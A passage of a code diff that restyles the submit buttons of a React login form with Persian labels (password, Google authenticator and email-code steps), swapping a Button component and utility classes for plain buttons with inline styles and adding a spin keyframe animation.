+                      textDecorationColor: "rgb(255, 255, 255)",
+                      textEmphasisColor: "rgb(255, 255, 255)",
+                      textTransform: "uppercase",
+                      transitionBehavior: "normal, normal, normal",
+                      transitionDelay: "0s, 0s, 0s",
+                      transitionDuration: "0.25s, 0.25s, 0.25s",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
+                      transitionTimingFunction:
+                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                      userSelect: "none",
+                      verticalAlign: "middle",
+                      width: "100%",
+                      border: "none",
+                      fontSize: "14px",
                       opacity: isSubmitting ? "0.5" : "1",
                     }}
                   >
                     {isSubmitting ? (
-                      <div className="flex items-center justify-center">
+                      <div
+                        style={{
+                          display: "flex",
+                          alignItems: "center",
+                          justifyContent: "center",
+                        }}
+                      >
                         <Loader2
-                          className="animate-spin mr-2"
-                          style={{ width: "16px", height: "16px" }}
+                          style={{
+                            width: "16px",
+                            height: "16px",
+                            marginLeft: "8px",
+                            animation: "spin 1s linear infinite",
+                          }}
                         />
                         <span>در حال بررسی...</span>
                       </div>
                     ) : (
                       "تایید رمز عبور"
                     )}
-                  </Button>
+                  </button>
                 </div>
               </form>
             </>
@@ -1139,39 +1700,74 @@ export const LoginForm = () => {
                     marginBottom: "16px",
                   }}
                 />
-                <Button
+                <button
                   onClick={handleGoogleCodeSubmit}
                   disabled={isSubmitting || googleCode.length !== 6}
-                  className="w-full"
                   style={{
+                    alignItems: "center",
                     backgroundColor: "rgb(23, 29, 38)",
-                    color: "rgb(255, 255, 255)",
+                    borderBottomLeftRadius: "8px",
+                    borderBottomRightRadius: "8px",
+                    borderColor: "rgb(255, 255, 255)",
                     borderRadius: "8px",
-                    padding: "10px 16px",
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    textTransform: "uppercase",
-                    border: "none",
+                    borderTopLeftRadius: "8px",
+                    borderTopRightRadius: "8px",
+                    color: "rgb(255, 255, 255)",
                     cursor:
                       isSubmitting || googleCode.length !== 6
                         ? "not-allowed"
                         : "pointer",
+                    display: "inline-flex",
+                    fontWeight: "500",
+                    justifyContent: "center",
+                    outlineColor: "rgb(255, 255, 255)",
+                    paddingBottom: "10px",
+                    paddingLeft: "16px",
+                    paddingRight: "16px",
+                    paddingTop: "10px",
+                    position: "relative",
+                    textAlign: "center",
+                    textDecorationColor: "rgb(255, 255, 255)",
+                    textEmphasisColor: "rgb(255, 255, 255)",
+                    textTransform: "uppercase",
+                    transitionBehavior: "normal, normal, normal",
+                    transitionDelay: "0s, 0s, 0s",
+                    transitionDuration: "0.25s, 0.25s, 0.25s",
+                    transitionProperty:
+                      "background-color, box-shadow, border-color",
+                    transitionTimingFunction:
+                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                    userSelect: "none",
+                    verticalAlign: "middle",
+                    width: "100%",
+                    border: "none",
+                    fontSize: "14px",
                     opacity:
                       isSubmitting || googleCode.length !== 6 ? "0.5" : "1",
                   }}
                 >
                   {isSubmitting ? (
-                    <div className="flex items-center justify-center">
+                    <div
+                      style={{
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                      }}
+                    >
                       <Loader2
-                        className="animate-spin mr-2"
-                        style={{ width: "16px", height: "16px" }}
+                        style={{
+                          width: "16px",
+                          height: "16px",
+                          marginLeft: "8px",
+                          animation: "spin 1s linear infinite",
+                        }}
                       />
                       <span>در حال تایید...</span>
                     </div>
                   ) : (
                     "تایید کد"
                   )}
-                </Button>
+                </button>
               </div>
             </>
           )}
@@ -1251,35 +1847,70 @@ export const LoginForm = () => {
                       marginBottom: "16px",
                     }}
                   />
-                  <Button
+                  <button
                     type="submit"
                     disabled={isSubmitting}
-                    className="w-full"
                     style={{
+                      alignItems: "center",
                       backgroundColor: "rgb(23, 29, 38)",
-                      color: "rgb(255, 255, 255)",
+                      borderBottomLeftRadius: "8px",
+                      borderBottomRightRadius: "8px",
+                      borderColor: "rgb(255, 255, 255)",
                       borderRadius: "8px",
-                      padding: "10px 16px",
-                      fontSize: "14px",
-                      fontWeight: "500",
-                      textTransform: "uppercase",
-                      border: "none",
+                      borderTopLeftRadius: "8px",
+                      borderTopRightRadius: "8px",
+                      color: "rgb(255, 255, 255)",
                       cursor: isSubmitting ? "not-allowed" : "pointer",
+                      display: "inline-flex",
+                      fontWeight: "500",
+                      justifyContent: "center",
+                      outlineColor: "rgb(255, 255, 255)",
+                      paddingBottom: "10px",
+                      paddingLeft: "16px",
+                      paddingRight: "16px",
+                      paddingTop: "10px",
+                      position: "relative",
+                      textAlign: "center",
+                      textDecorationColor: "rgb(255, 255, 255)",
+                      textEmphasisColor: "rgb(255, 255, 255)",
+                      textTransform: "uppercase",
+                      transitionBehavior: "normal, normal, normal",
+                      transitionDelay: "0s, 0s, 0s",
+                      transitionDuration: "0.25s, 0.25s, 0.25s",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
+                      transitionTimingFunction:
+                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                      userSelect: "none",
+                      verticalAlign: "middle",
+                      width: "100%",
+                      border: "none",
+                      fontSize: "14px",
                       opacity: isSubmitting ? "0.5" : "1",
                     }}
                   >
                     {isSubmitting ? (
-                      <div className="flex items-center justify-center">
+                      <div
+                        style={{
+                          display: "flex",
+                          alignItems: "center",
+                          justifyContent: "center",
+                        }}
+                      >
                         <Loader2
-                          className="animate-spin mr-2"
-                          style={{ width: "16px", height: "16px" }}
+                          style={{
+                            width: "16px",
+                            height: "16px",
+                            marginLeft: "8px",
+                            animation: "spin 1s linear infinite",
+                          }}
                         />
                         <span>در حال ارسال کد...</span>
                       </div>
                     ) : (
                       "ارسال کد تایید"
                     )}
-                  </Button>
+                  </button>
                 </div>
               </form>
             </>
@@ -1354,39 +1985,74 @@ export const LoginForm = () => {
                   >
                     ویرایش ایمیل
                   </Button>
-                  <Button
+                  <button
                     onClick={handleEmailCodeSubmit}
                     disabled={isSubmitting || emailCode.length !== 6}
-                    className="w-full"
                     style={{
+                      alignItems: "center",
                       backgroundColor: "rgb(23, 29, 38)",
-                      color: "rgb(255, 255, 255)",
+                      borderBottomLeftRadius: "8px",
+                      borderBottomRightRadius: "8px",
+                      borderColor: "rgb(255, 255, 255)",
                       borderRadius: "8px",
-                      padding: "10px 16px",
-                      fontSize: "14px",
-                      fontWeight: "500",
-                      textTransform: "uppercase",
-                      border: "none",
+                      borderTopLeftRadius: "8px",
+                      borderTopRightRadius: "8px",
+                      color: "rgb(255, 255, 255)",
                       cursor:
                         isSubmitting || emailCode.length !== 6
                           ? "not-allowed"
                           : "pointer",
+                      display: "inline-flex",
+                      fontWeight: "500",
+                      justifyContent: "center",
+                      outlineColor: "rgb(255, 255, 255)",
+                      paddingBottom: "10px",
+                      paddingLeft: "16px",
+                      paddingRight: "16px",
+                      paddingTop: "10px",
+                      position: "relative",
+                      textAlign: "center",
+                      textDecorationColor: "rgb(255, 255, 255)",
+                      textEmphasisColor: "rgb(255, 255, 255)",
+                      textTransform: "uppercase",
+                      transitionBehavior: "normal, normal, normal",
+                      transitionDelay: "0s, 0s, 0s",
+                      transitionDuration: "0.25s, 0.25s, 0.25s",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
+                      transitionTimingFunction:
+                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                      userSelect: "none",
+                      verticalAlign: "middle",
+                      width: "100%",
+                      border: "none",
+                      fontSize: "14px",
                       opacity:
                         isSubmitting || emailCode.length !== 6 ? "0.5" : "1",
                     }}
                   >
                     {isSubmitting ? (
-                      <div className="flex items-center justify-center">
+                      <div
+                        style={{
+                          display: "flex",
+                          alignItems: "center",
+                          justifyContent: "center",
+                        }}
+                      >
                         <Loader2
-                          className="animate-spin mr-2"
-                          style={{ width: "16px", height: "16px" }}
+                          style={{
+                            width: "16px",
+                            height: "16px",
+                            marginLeft: "8px",
+                            animation: "spin 1s linear infinite",
+                          }}
                         />
                         <span>در حال تایید...</span>
                       </div>
                     ) : (
                       "تایید کد"
                     )}
-                  </Button>
+                  </button>
                 </div>
               </div>
             </>
@@ -1421,6 +2087,15 @@ export const LoginForm = () => {
             display: flex;
             flex-direction: column;
             justify-content: flex-start;
+          }
+        }
+
+        @keyframes spin {
+          0% {
+            transform: rotate(0deg);
+          }
+          100% {
+            transform: rotate(360deg);
           }
         }
       `}</style>
